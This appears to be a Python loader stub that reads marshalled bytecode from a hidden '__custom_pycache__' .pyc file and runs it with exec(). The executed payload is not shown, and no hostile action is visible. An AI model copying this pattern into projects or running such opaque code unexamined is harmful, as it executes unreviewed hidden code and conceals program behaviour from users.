
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'chained_use_case_26f57371a1c04bebafb7e34db6ac17fe.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
